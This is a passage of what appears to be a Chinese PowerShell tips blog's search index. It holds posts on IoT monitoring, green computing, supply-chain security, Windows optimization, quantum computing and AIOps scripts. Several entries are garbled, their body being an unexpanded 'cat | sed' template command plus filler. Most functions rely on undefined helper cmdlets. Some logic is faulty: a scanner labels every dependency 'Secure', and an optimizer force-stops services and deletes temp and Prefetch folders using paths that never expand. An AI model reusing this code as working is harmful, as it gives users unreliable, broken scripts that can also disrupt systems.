[PSCustomObject]@{ DeviceID = $e.ApplicationMessage.Topic.Split('/')[-1] LastSeen = Get-Date Telemetry = $payload | ConvertFrom-Json } if ($payload -match '&quot;status&quot;:&quot;error&quot;') { $report.HealthStatus += [PSCustomObject]@{ DeviceID = $e.ApplicationMessage.Topic.Split('/')[-1] ErrorCode = ($payload | ConvertFrom-Json).errorCode Recommendation = &quot;检查设备固件版本并重启服务&quot; } } } } Register-ObjectEvent -InputObject $client -EventName ApplicationMessageReceived -Action { $global:report = $eventArgs | ForEach-Object { $_.UserEventArgs } } $report | Export-Csv -Path &quot;$env:TEMP/EdgeDeviceReport_$(Get-Date -Format yyyyMMdd).csv&quot; return $report} 核心功能： MQTT协议设备状态实时订阅 边缘计算设备健康状态分析 异常事件自动化预警 CSV报告持续输出 典型应用场景： 智能制造产线监控 智慧城市基础设施管理 农业物联网传感器网络 能源设备远程诊断","link":"/2024/10/23/powershell-iot-monitoring/"},{"title":"PowerShell 技能连载 - 绿色计算环境管理","text":"在绿色计算领域，环境管理对于降低能源消耗和碳排放至关重要。本文将介绍如何使用PowerShell构建一个绿色计算环境管理系统，包括能源监控、资源优化、碳排放计算等功能。 能源监控首先，让我们创建一个用于监控计算环境能源消耗的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108function Monitor-ComputingEnergy { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnvironmentID, [Parameter()] [string[]]$Metrics, [Parameter()] [int]$Interval = 300, [Parameter()] [string]$LogPath, [Parameter()] [hashtable]$Thresholds ) try { $monitor = [PSCustomObject]@{ EnvironmentID = $EnvironmentID StartTime = Get-Date Metrics = @{} Alerts = @() EnergyData = @{} } while ($true) { $checkTime = Get-Date # 获取能源指标 $metrics = Get-EnergyMetrics -EnvironmentID $EnvironmentID -Types $Metrics foreach ($metric in $Metrics) { $monitor.Metrics[$metric] = [PSCustomObject]@{ Value = $metrics[$metric].Value Unit = $metrics[$metric].Unit Timestamp = $checkTime Status = &quot;Normal&quot; } # 检查阈值 if ($Thresholds -and $Thresholds.ContainsKey($metric)) { $threshold = $Thresholds[$metric] if ($metrics[$metric].Value -gt $threshold.Max) { $monitor.Metrics[$metric].Status = &quot;Warning&quot; $monitor.Alerts += [PSCustomObject]@{ Time = $checkTime Type = &quot;HighEnergy&quot; Metric = $metric Value = $metrics[$metric].Value Threshold = $threshold.Max } } if ($metrics[$metric].Value -lt $threshold.Min) { $monitor.Metrics[$metric].Status = &quot;Warning&quot; $monitor.Alerts += [PSCustomObject]@{ Time = $checkTime Type = &quot;LowEfficiency&quot; Metric = $metric Value = $metrics[$metric].Value Threshold = $threshold.Min } } } # 更新能源数据 if (-not $monitor.EnergyData.ContainsKey($metric)) { $monitor.EnergyData[$metric] = @{ Values = @() Average = 0 Peak = 0 Trend = &quot;Stable&quot; } } $monitor.EnergyData[$metric].Values += $metrics[$metric].Value $monitor.EnergyData[$metric].Average = ($monitor.EnergyData[$metric].Values | Measure-Object -Average).Average $monitor.EnergyData[$metric].Peak = ($monitor.EnergyData[$metric].Values | Measure-Object -Maximum).Maximum # 分析趋势 $trend = Analyze-EnergyTrend -Values $monitor.EnergyData[$metric].Values $monitor.EnergyData[$metric].Trend = $trend } # 记录数据 if ($LogPath) { $monitor.Metrics | ConvertTo-Json | Out-File -FilePath $LogPath -Append } # 处理告警 foreach ($alert in $monitor.Alerts) { Send-EnergyAlert -Alert $alert } Start-Sleep -Seconds $Interval } return $monitor } catch { Write-Error &quot;能源监控失败：$_&quot; return $null }} 资源优化接下来，创建一个用于优化计算资源使用的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586function Optimize-ComputingResources { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnvironmentID, [Parameter()] [string[]]$ResourceTypes, [Parameter()] [ValidateSet(&quot;Energy&quot;, &quot;Cost&quot;, &quot;Performance&quot;)] [string]$OptimizationTarget = &quot;Energy&quot;, [Parameter()] [int]$MaxIterations = 100, [Parameter()] [hashtable]$Constraints ) try { $optimizer = [PSCustomObject]@{ EnvironmentID = $EnvironmentID StartTime = Get-Date Resources = @{} Optimizations = @{} Results = @{} } # 获取环境资源 $environmentResources = Get-EnvironmentResources -EnvironmentID $EnvironmentID # 分析资源使用 foreach ($type in $ResourceTypes) { $optimizer.Resources[$type] = [PSCustomObject]@{ CurrentUsage = $environmentResources[$type].Usage Efficiency = $environmentResources[$type].Efficiency Cost = $environmentResources[$type].Cost Energy = $environmentResources[$type].Energy } # 计算优化目标 $target = switch ($OptimizationTarget) { &quot;Energy&quot; { $optimizer.Resources[$type].Energy } &quot;Cost&quot; { $optimizer.Resources[$type].Cost } &quot;Performance&quot; { $optimizer.Resources[$type].Efficiency } } # 应用优化规则 $optimization = Apply-OptimizationRules ` -ResourceType $type ` -CurrentState $optimizer.Resources[$type] ` -Target $target ` -Constraints $Constraints if ($optimization.Success) { # 记录优化结果 $optimizer.Optimizations[$type] = [PSCustomObject]@{ OriginalState = $optimizer.Resources[$type] OptimizedState = $optimization.OptimizedState Improvements = $optimization.Improvements AppliedRules = $optimization.AppliedRules } # 更新资源状态 $optimizer.Resources[$type] = $optimization.OptimizedState # 计算改进 $improvements = Calculate-Improvements ` -Original $optimizer.Optimizations[$type].OriginalState ` -Optimized $optimizer.Optimizations[$type].OptimizedState $optimizer.Results[$type] = $improvements } } # 更新优化器状态 $optimizer.EndTime = Get-Date return $optimizer } catch { Write-Error &quot;资源优化失败：$_&quot; return $null }} 碳排放计算最后，创建一个用于计算计算环境碳排放的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687function Calculate-ComputingCarbon { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnvironmentID, [Parameter()] [DateTime]$StartDate, [Parameter()] [DateTime]$EndDate, [Parameter()] [string[]]$EmissionTypes, [Parameter()] [hashtable]$ConversionFactors ) try { $calculator = [PSCustomObject]@{ EnvironmentID = $EnvironmentID StartDate = $StartDate EndDate = $EndDate Emissions = @{} TotalCarbon = 0 Breakdown = @{} } # 获取能源消耗数据 $energyData = Get-EnergyConsumption ` -EnvironmentID $EnvironmentID ` -StartDate $StartDate ` -EndDate $EndDate # 计算各类排放 foreach ($type in $EmissionTypes) { $emissions = [PSCustomObject]@{ Type = $type Value = 0 Unit = &quot;kgCO2e&quot; Sources = @() Factors = @{} } # 应用转换因子 if ($ConversionFactors -and $ConversionFactors.ContainsKey($type)) { $factor = $ConversionFactors[$type] foreach ($source in $energyData.Sources) { $emissionValue = $source.Consumption * $factor $emissions.Value += $emissionValue $emissions.Sources += [PSCustomObject]@{ Source = $source.Name Consumption = $source.Consumption Factor = $factor Emission = $emissionValue } $emissions.Factors[$source.Name] = $factor } } $calculator.Emissions[$type] = $emissions $calculator.TotalCarbon += $emissions.Value # 计算占比 $calculator.Breakdown[$type] = [PSCustomObject]@{ Value = $emissions.Value Percentage = ($emissions.Value / $calculator.TotalCarbon) * 100 Sources = $emissions.Sources } } # 生成报告 $report = Generate-CarbonReport ` -Calculator $calculator ` -EnergyData $energyData $calculator.Report = $report return $calculator } catch { Write-Error &quot;碳排放计算失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理绿色计算环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# 配置能源监控$monitor = Monitor-ComputingEnergy -EnvironmentID &quot;GREEN001&quot; ` -Metrics @(&quot;PowerUsage&quot;, &quot;CoolingEfficiency&quot;, &quot;ServerUtilization&quot;) ` -Interval 300 ` -LogPath &quot;C:\\Logs\\energy_metrics.json&quot; ` -Thresholds @{ &quot;PowerUsage&quot; = @{ Min = 0 Max = 80 } &quot;CoolingEfficiency&quot; = @{ Min = 60 Max = 100 } &quot;ServerUtilization&quot; = @{ Min = 20 Max = 90 } }# 优化计算资源$optimizer = Optimize-ComputingResources -EnvironmentID &quot;GREEN001&quot; ` -ResourceTypes @(&quot;Servers&quot;, &quot;Storage&quot;, &quot;Network&quot;) ` -OptimizationTarget &quot;Energy&quot; ` -MaxIterations 100 ` -Constraints @{ &quot;Servers&quot; = @{ &quot;MinUtilization&quot; = 20 &quot;MaxUtilization&quot; = 90 &quot;CoolingLimit&quot; = 80 } &quot;Storage&quot; = @{ &quot;MinIOPS&quot; = 1000 &quot;MaxPower&quot; = 500 } &quot;Network&quot; = @{ &quot;MinBandwidth&quot; = 100 &quot;MaxLatency&quot; = 50 } }# 计算碳排放$carbon = Calculate-ComputingCarbon -EnvironmentID &quot;GREEN001&quot; ` -StartDate (Get-Date).AddDays(-30) ` -EndDate (Get-Date) ` -EmissionTypes @(&quot;Direct&quot;, &quot;Indirect&quot;, &quot;SupplyChain&quot;) ` -ConversionFactors @{ &quot;Direct&quot; = 0.5 &quot;Indirect&quot; = 0.3 &quot;SupplyChain&quot; = 0.2 } 最佳实践 实施能源监控 优化资源使用 计算碳排放 保持详细的运行记录 定期进行系统评估 实施节能策略 建立应急响应机制 保持系统文档更新","link":"/2024/10/24/powershell-green-computing/"},{"title":"PowerShell 技能连载 - 供应链安全管理","text":"在供应链安全领域，环境管理对于确保软件和硬件的安全性和完整性至关重要。本文将介绍如何使用PowerShell构建一个供应链安全管理系统，包括依赖扫描、漏洞检测、签名验证等功能。 依赖扫描首先，让我们创建一个用于扫描软件依赖的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Scan-SoftwareDependencies { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ProjectPath, [Parameter()] [string[]]$ScanTypes, [Parameter()] [string]$OutputPath, [Parameter()] [hashtable]$Thresholds, [Parameter()] [switch]$AutoFix ) try { $scanner = [PSCustomObject]@{ ProjectPath = $ProjectPath StartTime = Get-Date Dependencies = @{} Vulnerabilities = @() Recommendations = @() } # 获取项目依赖 $dependencies = Get-ProjectDependencies -Path $ProjectPath foreach ($dep in $dependencies) { $scanner.Dependencies[$dep.Name] = [PSCustomObject]@{ Version = $dep.Version Source = $dep.Source License = $dep.License SecurityScore = 0 LastUpdated = $dep.LastUpdated Status = &quot;Unknown&quot; } # 检查安全评分 $securityScore = Get-DependencySecurityScore ` -Name $dep.Name ` -Version $dep.Version $scanner.Dependencies[$dep.Name].SecurityScore = $securityScore # 检查漏洞 $vulnerabilities = Get-DependencyVulnerabilities ` -Name $dep.Name ` -Version $dep.Version if ($vulnerabilities.Count -gt 0) { $scanner.Vulnerabilities += $vulnerabilities # 生成修复建议 $recommendations = Get-SecurityRecommendations ` -Vulnerabilities $vulnerabilities $scanner.Recommendations += $recommendations # 自动修复 if ($AutoFix -and $recommendations.FixAvailable) { $fixResult = Apply-SecurityFix ` -Dependency $dep.Name ` -Recommendation $recommendations if ($fixResult.Success) { $scanner.Dependencies[$dep.Name].Status = &quot;Fixed&quot; } } } # 更新依赖状态 $scanner.Dependencies[$dep.Name].Status = &quot;Secure&quot; } # 生成报告 if ($OutputPath) { $report = Generate-SecurityReport ` -Scanner $scanner ` -Thresholds $Thresholds $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputPath } # 更新扫描器状态 $scanner.EndTime = Get-Date return $scanner } catch { Write-Error &quot;依赖扫描失败：$_&quot; return $null }} 漏洞检测接下来，创建一个用于检测供应链漏洞的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586function Detect-SupplyChainVulnerabilities { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ComponentID, [Parameter()] [string[]]$VulnerabilityTypes, [Parameter()] [ValidateSet(&quot;Critical&quot;, &quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;)] [string]$Severity = &quot;High&quot;, [Parameter()] [hashtable]$ScanConfig, [Parameter()] [string]$ReportPath ) try { $detector = [PSCustomObject]@{ ComponentID = $ComponentID StartTime = Get-Date Vulnerabilities = @() Components = @{} RiskScore = 0 } # 获取组件信息 $component = Get-ComponentInfo -ComponentID $ComponentID # 扫描组件 foreach ($type in $VulnerabilityTypes) { $scanResult = Scan-ComponentVulnerabilities ` -Component $component ` -Type $type ` -Severity $Severity ` -Config $ScanConfig if ($scanResult.Vulnerabilities.Count -gt 0) { $detector.Vulnerabilities += $scanResult.Vulnerabilities # 计算风险评分 $riskScore = Calculate-RiskScore ` -Vulnerabilities $scanResult.Vulnerabilities $detector.RiskScore = [Math]::Max($detector.RiskScore, $riskScore) # 记录组件状态 $detector.Components[$type] = [PSCustomObject]@{ Status = &quot;Vulnerable&quot; RiskScore = $riskScore Vulnerabilities = $scanResult.Vulnerabilities Recommendations = $scanResult.Recommendations } } else { $detector.Components[$type] = [PSCustomObject]@{ Status = &quot;Secure&quot; RiskScore = 0 Vulnerabilities = @() Recommendations = @() } } } # 生成报告 if ($ReportPath) { $report = Generate-VulnerabilityReport ` -Detector $detector ` -Component $component $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新检测器状态 $detector.EndTime = Get-Date return $detector } catch { Write-Error &quot;漏洞检测失败：$_&quot; return $null }} 上面的代码定义了一个名为 Scan-SoftwareDependencies 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 签名验证最后，创建一个用于验证软件签名的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788function Verify-SoftwareSignature { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SoftwareID, [Parameter()] [string[]]$VerificationTypes, [Parameter()] [ValidateSet(&quot;Strict&quot;, &quot;Standard&quot;, &quot;Basic&quot;)] [string]$VerificationLevel = &quot;Standard&quot;, [Parameter()] [hashtable]$TrustedSigners, [Parameter()] [string]$LogPath ) try { $verifier = [PSCustomObject]@{ SoftwareID = $SoftwareID StartTime = Get-Date Signatures = @{} VerificationResults = @{} TrustStatus = &quot;Unknown&quot; } # 获取软件信息 $software = Get-SoftwareInfo -SoftwareID $SoftwareID # 验证签名 foreach ($type in $VerificationTypes) { $verification = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Signer = $null Timestamp = $null Certificate = $null TrustLevel = 0 } # 获取签名信息 $signature = Get-SoftwareSignature ` -Software $software ` -Type $type if ($signature) { $verification.Signer = $signature.Signer $verification.Timestamp = $signature.Timestamp $verification.Certificate = $signature.Certificate # 验证签名 $verifyResult = Test-SignatureVerification ` -Signature $signature ` -Level $VerificationLevel ` -TrustedSigners $TrustedSigners $verification.Status = $verifyResult.Status $verification.TrustLevel = $verifyResult.TrustLevel } $verifier.Signatures[$type] = $signature $verifier.VerificationResults[$type] = $verification } # 确定整体信任状态 $trustStatus = Determine-TrustStatus ` -Results $verifier.VerificationResults $verifier.TrustStatus = $trustStatus # 记录验证结果 if ($LogPath) { $verifier | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新验证器状态 $verifier.EndTime = Get-Date return $verifier } catch { Write-Error &quot;签名验证失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理供应链安全的示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 扫描软件依赖$scanner = Scan-SoftwareDependencies -ProjectPath &quot;C:\\Projects\\MyApp&quot; ` -ScanTypes @(&quot;NuGet&quot;, &quot;NPM&quot;, &quot;PyPI&quot;) ` -OutputPath &quot;C:\\Reports\\dependencies.json&quot; ` -Thresholds @{ &quot;SecurityScore&quot; = @{ Min = 80 Max = 100 } &quot;Vulnerabilities&quot; = @{ Max = 0 } } ` -AutoFix# 检测供应链漏洞$detector = Detect-SupplyChainVulnerabilities -ComponentID &quot;COMP001&quot; ` -VulnerabilityTypes @(&quot;Dependencies&quot;, &quot;BuildTools&quot;, &quot;Artifacts&quot;) ` -Severity &quot;High&quot; ` -ScanConfig @{ &quot;Dependencies&quot; = @{ &quot;CheckUpdates&quot; = $true &quot;CheckVulnerabilities&quot; = $true } &quot;BuildTools&quot; = @{ &quot;CheckVersions&quot; = $true &quot;CheckIntegrity&quot; = $true } &quot;Artifacts&quot; = @{ &quot;CheckSignatures&quot; = $true &quot;CheckHashes&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\vulnerabilities.json&quot;# 验证软件签名$verifier = Verify-SoftwareSignature -SoftwareID &quot;SW001&quot; ` -VerificationTypes @(&quot;Code&quot;, &quot;Package&quot;, &quot;Artifact&quot;) ` -VerificationLevel &quot;Strict&quot; ` -TrustedSigners @{ &quot;Microsoft&quot; = @{ &quot;CertificateThumbprint&quot; = &quot;1234567890ABCDEF&quot; &quot;TrustLevel&quot; = &quot;High&quot; } &quot;MyCompany&quot; = @{ &quot;CertificateThumbprint&quot; = &quot;FEDCBA0987654321&quot; &quot;TrustLevel&quot; = &quot;Medium&quot; } } ` -LogPath &quot;C:\\Logs\\signature_verification.json&quot; 最佳实践 定期扫描依赖 检测供应链漏洞 验证软件签名 保持详细的运行记录 定期进行安全评估 实施安全策略 建立应急响应机制 保持系统文档更新","link":"/2024/10/28/powershell-supply-chain-security/"},{"title":"","text":"$(cat _posts/2024-10-29-powershell-audio-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/29/powershell-audio-processing/"},{"title":"","text":"$(cat _posts/2024-10-31-powershell-word-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/10/31/powershell-word-processing/"},{"title":"PowerShell 技能连载 - Windows系统自动化优化","text":"在企业IT运维中，系统服务的合理配置直接影响服务器性能。传统手动优化方式效率低下，本文演示如何通过PowerShell实现Windows服务的自动化管控与系统性能调优。 12345678910111213141516171819202122232425262728293031323334function Optimize-WindowsSystem { param( [ValidateRange(1,24)] [int]$IdleThresholdHours = 4, [switch]$CleanTempFiles ) try { # 检测闲置服务 $idleServices = Get-Service | Where-Object { $_.Status -eq 'Running' -and (Get-Process -Name $_.Name -ErrorAction SilentlyContinue).StartTime -lt (Get-Date).AddHours(-$IdleThresholdHours) } # 关闭非核心闲置服务 $idleServices | Where-Object {$_.DisplayName -notmatch 'Critical'} | Stop-Service -Force # 清理临时文件 if ($CleanTempFiles) { $tempPaths = @('$env:TEMP','$env:SystemRoot\\Temp','$env:SystemRoot\\Prefetch') Remove-Item -Path $tempPaths -Recurse -Force -ErrorAction SilentlyContinue } # 生成优化报告 [PSCustomObject]@{ StoppedServices = $idleServices.Count TempFilesCleaned = if($CleanTempFiles){ (Get-ChildItem $tempPaths -Recurse | Measure-Object).Count }else{ 0 } Timestamp = Get-Date } | Export-Clixml -Path &quot;$env:ProgramData\\SystemOptimizationReport.xml&quot; } catch { Write-EventLog -LogName Application -Source 'SystemOptimizer' -EntryType Error -EventId 501 -Message $_.Exception.Message }} 实现原理分析： 通过进程启动时间判断服务闲置状态，避免误停关键服务 支持临时文件清理功能并配备安全删除机制 采用XML格式记录优化操作审计日志 集成Windows事件日志实现错误追踪 参数验证机制防止误输入数值 该脚本将系统维护工作从手动操作转为计划任务驱动，特别适合需要批量管理数据中心服务器的运维场景。","link":"/2024/10/30/powershell-windows-optimization/"},{"title":"","text":"$(cat _posts/2024-11-01-powershell-plc-monitoring.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/01/powershell-plc-monitoring/"},{"title":"PowerShell 技能连载 - 量子计算环境管理","text":"在量子计算领域，环境管理对于确保量子算法的正确执行至关重要。本文将介绍如何使用PowerShell构建一个量子计算环境管理系统，包括量子模拟器管理、量子电路优化、资源调度等功能。 量子模拟器管理首先，让我们创建一个用于管理量子模拟器的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function Manage-QuantumSimulator { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SimulatorID, [Parameter()] [ValidateSet(&quot;Qiskit&quot;, &quot;Cirq&quot;, &quot;Q#&quot;)] [string]$Type = &quot;Qiskit&quot;, [Parameter()] [int]$Qubits = 20, [Parameter()] [int]$MemoryGB = 16, [Parameter()] [switch]$AutoOptimize ) try { $simulator = [PSCustomObject]@{ SimulatorID = $SimulatorID Type = $Type Qubits = $Qubits MemoryGB = $MemoryGB StartTime = Get-Date Status = &quot;Initializing&quot; Resources = @{} Circuits = @() } # 初始化模拟器 $initResult = Initialize-QuantumSimulator -Type $Type ` -Qubits $Qubits ` -MemoryGB $MemoryGB if (-not $initResult.Success) { throw &quot;模拟器初始化失败：$($initResult.Message)&quot; } # 配置资源 $simulator.Resources = [PSCustomObject]@{ CPUUsage = 0 MemoryUsage = 0 GPUUsage = 0 Temperature = 0 } # 加载量子电路 $circuits = Get-QuantumCircuits -SimulatorID $SimulatorID foreach ($circuit in $circuits) { $simulator.Circuits += [PSCustomObject]@{ CircuitID = $circuit.ID Name = $circuit.Name Qubits = $circuit.Qubits Gates = $circuit.Gates Status = &quot;Loaded&quot; } } # 自动优化 if ($AutoOptimize) { foreach ($circuit in $simulator.Circuits) { $optimization = Optimize-QuantumCircuit -Circuit $circuit $circuit.OptimizedGates = $optimization.OptimizedGates $circuit.Improvement = $optimization.Improvement } } # 更新状态 $simulator.Status = &quot;Ready&quot; $simulator.EndTime = Get-Date return $simulator } catch { Write-Error &quot;量子模拟器管理失败：$_&quot; return $null }} 量子电路优化接下来，创建一个用于优化量子电路的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function Optimize-QuantumCircuit { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [PSCustomObject]$Circuit, [Parameter()] [ValidateSet(&quot;Depth&quot;, &quot;Gates&quot;, &quot;ErrorRate&quot;)] [string]$OptimizationTarget = &quot;Depth&quot;, [Parameter()] [decimal]$TargetErrorRate = 0.001, [Parameter()] [int]$MaxIterations = 100 ) try { $optimizer = [PSCustomObject]@{ CircuitID = $Circuit.CircuitID StartTime = Get-Date Target = $OptimizationTarget OriginalGates = $Circuit.Gates.Count OptimizedGates = @() Metrics = @{} Iterations = 0 } # 分析电路 $analysis = Analyze-QuantumCircuit -Circuit $Circuit # 优化循环 while ($optimizer.Iterations -lt $MaxIterations) { $iteration = [PSCustomObject]@{ Iteration = $optimizer.Iterations + 1 Gates = $Circuit.Gates ErrorRate = 0 Depth = 0 } # 应用优化规则 $optimized = Apply-OptimizationRules -Circuit $iteration.Gates ` -Target $OptimizationTarget # 计算指标 $metrics = Calculate-CircuitMetrics -Circuit $optimized # 检查优化目标 if ($OptimizationTarget -eq &quot;ErrorRate&quot; -and $metrics.ErrorRate -le $TargetErrorRate) { break } # 更新优化器状态 $optimizer.OptimizedGates = $optimized $optimizer.Metrics = $metrics $optimizer.Iterations++ } # 计算改进 $optimizer.Improvement = [PSCustomObject]@{ GatesReduction = $optimizer.OriginalGates - $optimizer.OptimizedGates.Count DepthReduction = $analysis.OriginalDepth - $optimizer.Metrics.Depth ErrorRateImprovement = $analysis.OriginalErrorRate - $optimizer.Metrics.ErrorRate } # 更新优化器状态 $optimizer.EndTime = Get-Date return $optimizer } catch { Write-Error &quot;量子电路优化失败：$_&quot; return $null }} 资源调度最后，创建一个用于调度量子计算资源的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788function Schedule-QuantumResources { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ClusterID, [Parameter()] [string[]]$JobTypes, [Parameter()] [int]$Priority, [Parameter()] [DateTime]$Deadline, [Parameter()] [hashtable]$ResourceRequirements ) try { $scheduler = [PSCustomObject]@{ ClusterID = $ClusterID StartTime = Get-Date Jobs = @() Resources = @{} Schedule = @{} } # 获取集群资源 $clusterResources = Get-ClusterResources -ClusterID $ClusterID # 获取待调度作业 $pendingJobs = Get-PendingJobs -ClusterID $ClusterID ` -Types $JobTypes ` -Priority $Priority foreach ($job in $pendingJobs) { $jobInfo = [PSCustomObject]@{ JobID = $job.ID Type = $job.Type Priority = $job.Priority Requirements = $job.Requirements Status = &quot;Pending&quot; Allocation = @{} StartTime = $null EndTime = $null } # 检查资源需求 $allocation = Find-ResourceAllocation ` -Job $jobInfo ` -Resources $clusterResources ` -Requirements $ResourceRequirements if ($allocation.Success) { # 分配资源 $jobInfo.Allocation = $allocation.Resources $jobInfo.Status = &quot;Scheduled&quot; $jobInfo.StartTime = $allocation.StartTime $jobInfo.EndTime = $allocation.EndTime # 更新调度表 $scheduler.Schedule[$jobInfo.JobID] = [PSCustomObject]@{ StartTime = $jobInfo.StartTime EndTime = $jobInfo.EndTime Resources = $jobInfo.Allocation } # 更新集群资源 $clusterResources = Update-ClusterResources ` -Resources $clusterResources ` -Allocation $jobInfo.Allocation } $scheduler.Jobs += $jobInfo } # 更新调度器状态 $scheduler.Resources = $clusterResources $scheduler.EndTime = Get-Date return $scheduler } catch { Write-Error &quot;资源调度失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理量子计算环境的示例： 1234567891011121314151617181920212223242526272829303132# 配置量子模拟器$simulatorConfig = @{ SimulatorID = &quot;QSIM001&quot; Type = &quot;Qiskit&quot; Qubits = 20 MemoryGB = 32 AutoOptimize = $true}# 启动量子模拟器$simulator = Manage-QuantumSimulator -SimulatorID $simulatorConfig.SimulatorID ` -Type $simulatorConfig.Type ` -Qubits $simulatorConfig.Qubits ` -MemoryGB $simulatorConfig.MemoryGB ` -AutoOptimize:$simulatorConfig.AutoOptimize# 优化量子电路$optimization = Optimize-QuantumCircuit -Circuit $simulator.Circuits[0] ` -OptimizationTarget &quot;Depth&quot; ` -TargetErrorRate 0.001 ` -MaxIterations 100# 调度量子资源$scheduler = Schedule-QuantumResources -ClusterID &quot;QCLUSTER001&quot; ` -JobTypes @(&quot;QuantumSimulation&quot;, &quot;CircuitOptimization&quot;) ` -Priority 1 ` -Deadline (Get-Date).AddHours(24) ` -ResourceRequirements @{ &quot;Qubits&quot; = 20 &quot;MemoryGB&quot; = 32 &quot;GPUCores&quot; = 4 } 最佳实践 实施量子电路优化 建立资源调度策略 实现错误率控制 保持详细的运行记录 定期进行系统评估 实施访问控制策略 建立应急响应机制 保持系统文档更新","link":"/2024/11/04/powershell-quantum-computing/"},{"title":"","text":"$(cat _posts/2024-11-05-powershell-pdf-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/05/powershell-pdf-processing/"},{"title":"","text":"$(cat _posts/2024-11-07-powershell-array-operations.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/11/07/powershell-array-operations/"},{"title":"PowerShell 技能连载 - 智能运维自动化管理","text":"在智能运维领域，自动化管理对于提高系统运维效率和准确性至关重要。本文将介绍如何使用PowerShell构建一个智能运维自动化管理系统，包括智能监控、自动诊断、预测性维护等功能。 智能监控首先，让我们创建一个用于智能监控系统状态的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113function Monitor-AIOpsStatus { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnvironmentID, [Parameter()] [string[]]$MonitorTypes, [Parameter()] [string[]]$Metrics, [Parameter()] [hashtable]$Thresholds, [Parameter()] [string]$ReportPath, [Parameter()] [switch]$AutoDiagnose ) try { $monitor = [PSCustomObject]@{ EnvironmentID = $EnvironmentID StartTime = Get-Date MonitorStatus = @{} Metrics = @{} Insights = @() } # 获取环境信息 $environment = Get-EnvironmentInfo -EnvironmentID $EnvironmentID # 智能监控 foreach ($type in $MonitorTypes) { $monitor.MonitorStatus[$type] = @{} $monitor.Metrics[$type] = @{} foreach ($component in $environment.Components[$type]) { $status = [PSCustomObject]@{ ComponentID = $component.ID Status = &quot;Unknown&quot; Metrics = @{} Health = 0 Insights = @() } # 获取组件指标 $componentMetrics = Get-ComponentMetrics ` -Component $component ` -Metrics $Metrics $status.Metrics = $componentMetrics # 评估健康状态 $health = Calculate-ComponentHealth ` -Metrics $componentMetrics ` -Thresholds $Thresholds $status.Health = $health # 生成智能洞察 $insights = Generate-ComponentInsights ` -Metrics $componentMetrics ` -Health $health if ($insights.Count -gt 0) { $status.Status = &quot;Warning&quot; $status.Insights = $insights $monitor.Insights += $insights # 自动诊断 if ($AutoDiagnose) { $diagnosis = Start-ComponentDiagnosis ` -Component $component ` -Insights 